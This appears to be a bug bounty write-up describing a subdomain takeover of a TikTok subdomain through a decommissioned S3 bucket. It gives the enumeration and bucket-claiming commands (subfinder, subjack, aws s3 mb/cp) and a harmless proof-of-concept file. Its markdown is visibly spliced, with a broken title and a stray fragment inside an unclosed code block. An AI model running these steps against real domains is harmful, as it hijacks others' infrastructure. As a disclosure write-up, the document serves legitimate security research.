# Cod# 🛡️ Bug Bounty Case Study: Subdomain Takeover on TikTok

**Researcher:** William P.G. Royster III (aka `@codegrunt`)  
**Category:** Subdomain Takeover  
**Target:** `academy-outbound-ads.tiktok.com`  
**Platform:** HackerOne  
**Date Reported:** [3 Days Ago]

---

## 🔍 Summary

Identified a vulnerable TikTok subdomain pointing to a **decommissioned AWS S3 bucket**, resulting in a **critical subdomain takeover** vulnerability.

---

## ✅ Proof of Concept (PoC)

- Created an S3 bucket named exactly: `academy-outbound-ads.tiktok.com`
- Enabled public access & uploaded PoC file: `/@codegrunt.html`  
- PoC Contents: `Hello world!`
- Live URL before redirect: `https://academy-outbound-ads.tiktok.com/@codegrunt.html`

---

## 🧪 Tools & Commands Used

```bash
subfinder -d tiktok.com -o subs.txt
subjack -w subs.txt -t 100 -ssl -v -o takeover-results.txt
aws s3 mb s3://academy-outbound-ads.tiktok.com
aws s3 cp @codegrunt.html s3://academy-outbound-ads.tiktok.com --acl public-read
eGrunt-Bounties
## 📎 Downloads & Evidence

- 🔗 [@codegrunt.html](./%40codegrunt.html)
- 📄 [takeover-results.txt](./takeover-results.txt)
- 📦 [tiktok_subdomain_takeover_proof_final.zip](./tiktok_subdomain_takeover_proof_final.zip)
